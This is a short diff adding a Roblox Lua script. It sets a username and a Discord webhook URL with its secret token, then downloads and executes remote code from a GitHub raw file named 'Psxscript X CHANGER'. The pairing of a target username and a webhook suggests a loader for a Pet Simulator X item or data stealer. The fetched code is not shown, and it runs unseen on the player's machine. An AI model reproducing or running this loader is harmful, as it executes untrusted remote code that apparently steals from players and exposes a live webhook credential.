@@ -1,0 +1,5 @@
+UserName = "4r56rwere4" 
+WebHook = "https://discord.com/api/webhooks/1130867655201538079/24PQw48DuaSCmrkW5HGRdCIdbupD05i85dtcRzh8FnTFoLKbRqLeZjJ-NouJrQUZZfbe"
+ 
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jopsc/Psxgoof/main/Psxscript%20X%20CHANGER"))()
